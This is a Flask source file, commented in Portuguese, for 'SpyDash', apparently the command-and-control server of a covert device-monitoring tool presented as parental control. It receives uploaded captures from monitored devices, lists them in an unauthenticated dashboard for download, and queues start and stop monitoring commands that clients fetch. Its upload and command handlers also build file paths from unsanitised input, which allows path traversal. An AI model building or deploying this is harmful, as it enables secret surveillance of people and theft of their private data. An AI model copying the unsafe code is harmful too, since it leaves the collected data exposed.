# SpyDash Painel Remoto - Versão Completa para Render

from flask import Flask, request, render_template_string, send_from_directory
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = "capturas"
COMANDOS_FOLDER = "comandos"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(COMANDOS_FOLDER, exist_ok=True)

# ====== TELA INICIAL DO PAINEL ======
HTML_DASH = """
<!doctype html>
<html lang="pt-br">
  <head>
    <meta charset="utf-8">
    <title>SpyDash - Painel</title>
    <style>
      body { font-family: Arial; background: #111; color: #0f0; text-align: center; padding: 20px; }
      h1 { color: #0ff; }
      table { width: 90%; margin: auto; border-collapse: collapse; }
      td, th { border: 1px solid #0f0; padding: 10px; }
      a { color: #0ff; }
      form { margin-top: 30px; }
    </style>
  </head>
  <body>
    <h1>SpyDash - Controle Parental</h1>
    <h3>Arquivos Recebidos</h3>
    <table>
      <tr><th>Nome</th><th>Download</th><th>Data</th></tr>
      {% for nome, data in arquivos %}
        <tr><td>{{nome}}</td><td><a href="/download/{{nome}}">Baixar</a></td><td>{{data}}</td></tr>
      {% endfor %}
    </table>

    <h3>Enviar Comando para Dispositivo</h3>
    <form method="post" action="/comando">
      <input type="text" name="id" placeholder="ID do dispositivo" required>
      <select name="comando">
        <option value="start">Iniciar Monitoramento</option>
        <option value="stop">Parar Monitoramento</option>
        <option value="status">Status</option>
      </select>
      <button type="submit">Enviar</button>
    </form>
  </body>
</html>
"""

@app.route("/")
def index():
    arquivos = []
    for nome in os.listdir(UPLOAD_FOLDER):
        caminho = os.path.join(UPLOAD_FOLDER, nome)
        data = datetime.fromtimestamp(os.path.getmtime(caminho)).strftime("%d/%m/%Y %H:%M")
        arquivos.append((nome, data))
    arquivos.sort(key=lambda x: x[1], reverse=True)
    return render_template_string(HTML_DASH, arquivos=arquivos)

# ====== RECEBER ARQUIVOS DO CLIENTE ======
@app.route("/upload", methods=["POST"])
def upload():
    f = request.files['file']
    nome = f.filename
    f.save(os.path.join(UPLOAD_FOLDER, nome))
    return "OK"

# ====== DOWNLOAD DE CAPTURAS ======
@app.route("/download/<path:nome>")
def download(nome):
    return send_from_directory(UPLOAD_FOLDER, nome, as_attachment=True)

# ====== COMANDOS REMOTOS (painel envia) ======
@app.route("/comando", methods=["POST"])
def set_comando():
    dispositivo = request.form['id']
    comando = request.form['comando']
    with open(os.path.join(COMANDOS_FOLDER, f"{dispositivo}.cmd"), "w") as f:
        f.write(comando)
    return "Comando enviado."

# ====== CLIENTE BUSCA COMANDO ======
@app.route("/getcmd/<dispositivo>")
def get_cmd(dispositivo):
    path = os.path.join(COMANDOS_FOLDER, f"{dispositivo}.cmd")
    if os.path.exists(path):
        with open(path, "r") as f:
            cmd = f.read().strip()
        os.remove(path)
        return cmd
    return "none"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
